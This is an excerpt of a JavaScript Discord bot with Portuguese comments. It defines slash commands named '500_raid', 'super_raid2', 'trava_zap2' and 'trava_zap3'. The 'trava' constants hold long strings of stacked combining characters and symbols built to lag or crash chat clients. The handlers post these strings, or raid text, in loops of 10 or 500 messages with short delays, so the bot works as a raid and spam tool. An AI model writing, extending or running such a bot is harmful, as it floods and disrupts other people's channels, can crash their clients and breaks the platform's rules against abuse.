...
// ✅ TRAVA ZAP 2 (Texto Caótico + Link)
const TRAVA_2_CONTENT = `ྏ࿆༻༺͙͙͙͙͙͙͙͙͙͙͙͙͙͙͙͙͙͙͙͙ ⃝ྏ⃝ྏ͙͙͙͙͙͙͙͙͙͙͙͙͙͙͙⃝ྏ࿆͙͙͙͙ ྏ࿆༻༺༻༻༺༻༻༺༺༻༻༺༻༻༺༺༻༻༻༻ ྏ࿆༻༺͙͙͙͙͙͙͙͙͙͙͙͙ ྏ࿆ ⃘⃤꙰ ₣ℌ e ₹ቾ  ⃘⃤꙰ .  ྏ࿆༻༺ྏ࿆༻ ྏ࿆༻༺ ͙͙͙͙͙͙͙͙͙͙͙͙͙⃝ྏ⃝ྏ͙͙͙͙͙͙͙͙͙͙͙͙͙͙͙ ⃝ྏ࿆͙͙͙͙͙͙͙͙͙͙͙͙͙͙͙͙͙͙͙ྏ࿆ ༻ྏ࿆ 🆂🅸🆂🆃🅴🅼🅰 🆂🅴🅽🅳🅾 🆃🆁🅰🆅🅰🅳🅾 CARREGANDO 99,9% ྏ࿆༻༺͙͙͙͙͙͙͙͙͙͙͙͙͙͙͙͙͙͙͙⃝ྏ⃝ྏ͙͙͙͙ . ༻ ͙͙͙͙͙͙͙͙͙⃝ྏ⃝ྏ͙͙͙͙͙͙͙͙͙͙͙͙͙͙͙͙͙͙͙⃝ྏ࿆͙͙͙͙͙͙͙͙͙͙͙͙͙͙ ࿆༻ྏ࿆ ྏ࿆༻༺͙͙͙͙͙͙͙͙͙͙͙͙͙͙͙͙͙͙͙͙ ྏ࿆༻༺͙͙͙͙͙͙͙͙͙͙͙͙͙͙͙͙͙͙͙͙ ⃝ ྏ࿆͙͙͙͙͙͙͙͙͙͙͙͙͙͙͙͙͙͙͙͙ྏ࿆༻ ྏ࿆༻༺͙͙͙͙͙͙͙͙͙͙͙͙͙͙͙͙͙͙͙͙ ྏ ⃝ ⃝ ྏ࿆༻༺͙͙͙͙͙͙͙͙͙͙͙͙͙͙͙͙͙͙͙͙ ྏ ⃝ ྏ͙͙͙͙͙͙͙͙͙͙͙͙͙͙͙͙͙͙͙͙ ྏ͙͙͙͙͙͙͙͙͙͙͙͙͙͙͙͙͙͙͙͙ ྏ͙͙͙͙͙͙͙͙͙͙͙͙͙͙͙͙͙͙͙͙ ྏ࿆͙͙͙͙͙͙͙͙͙͙͙͙͙͙͙͙͙͙͙͙ྏ࿆༻ྏ࿆ ྏ͙͙͙͙͙͙͙͙͙͙͙͙͙͙͙͙͙͙͙͙     💀⚰️ꌗꀤꌗ꓄ꍟꎭꍏ ꓄ꋪꍏᐯꍏꀸꂦ⚰️💀             ɆɌɌØɌ Ø₣ $¥$₮ɆⲘ ... ྏ࿆༻༺͙͙͙͙͙͙͙͙͙͙͙͙͙͙͙͙͙͙͙͙⃝ྏ⃝ྏ͙͙͙͙ . ༺༻ ͙࿆༻ྏ࿆                   ɆɌɌØɌ 666 ❌ ɆɌɌØɌ 666 ​ ✦ӈ͜͡➳https://youtu.be/hBe0VCso0qs`;

// ✅ TRAVA ZAP 3 (Gerado via código)
const T3_BASE = "100%㝎ํ㝎ํ㝎ํ 100%㝎ํ㝎ํ㝎ํ㝎ํ㝎ํ 100%㝎ํ㝎ํ㝎ํ㝎ํ㝎ํ ████████████]99% ║▌│█║▌│ █ ║▌│█│║▌║ ㊀㊁㊂㊃㊄㊅㊆ ㊇㊈㊉";
const TRAVA_3_CONTENT = Array(20).fill(T3_BASE).join(" ").substring(0, 1950);

// ✅ RAID 2 CONTENT (Se mudar este texto, o /500_raid muda junto)
...
module.exports = async (TOKEN, CLIENT_ID) => {
    ...
    const commands = [
        ...
        new SlashCommandBuilder().setName('500_raid').setDescription('RAID 500x (2.5s Delay)').setIntegrationTypes([0, 1]).setContexts([0, 1, 2]), // Novo Comando
        new SlashCommandBuilder().setName('super_raid2').setDescription('SUPER RAID V2 MODDZ').setIntegrationTypes([0, 1]).setContexts([0, 1, 2]),
        new SlashCommandBuilder().setName('trava_zap2').setDescription('TRAVA ZAP 2 (CAOS + LINK)').setIntegrationTypes([0, 1]).setContexts([0, 1, 2]),
        new SlashCommandBuilder().setName('trava_zap3').setDescription('TRAVA ZAP 3 (CARREGAMENTO)').setIntegrationTypes([0, 1]).setContexts([0, 1, 2]),
    ...
    client.on('interactionCreate', async interaction => {
        ...
        if (commandName === '500_raid') {
            // Usa o conteúdo do RAID2_CONTENT (seja "ooooi" ou o texto gigante se você mudar)
            const content = RAID2_CONTENT || "RAID 2 Content Missing";
            const chunks = chunkString(content, 1900); // Divide em blocos de 1900 se passar o limite

            // Loop de 500 vezes
            for (let i = 0; i < 500; i++) {
                if (stopSignals.get(user.id)) break; // Checa se pediu para parar

                // Loop dos pedaços (caso o texto seja maior que 2000)
                for (const chunk of chunks) {
                    if (stopSignals.get(user.id)) break;
                    await interaction.followUp({ content: chunk }).catch((e) => console.log(`Erro 500_raid: ${e.message}`));
                    await wait(500); // Pequeno delay entre pedaços da mesma mensagem
                }
                // Delay principal de 2.5s entre as repetições
                await wait(2500);
            }
        }
        ...
        if (commandName === 'trava_zap2') {
            for(let i=0; i < 10; i++) {
                if (stopSignals.get(user.id)) break;
                await interaction.followUp({ content: TRAVA_2_CONTENT.substring(0, 1950) }).catch((e) => console.log(e.message));
                await wait(2500); 
            }
        }

        if (commandName === 'trava_zap3') {
            for(let i=0; i < 10; i++) {
                if (stopSignals.get(user.id)) break;
                await interaction.followUp({ content: TRAVA_3_CONTENT }).catch((e) => console.log(e.message));
                await wait(2500); 
            }
        }
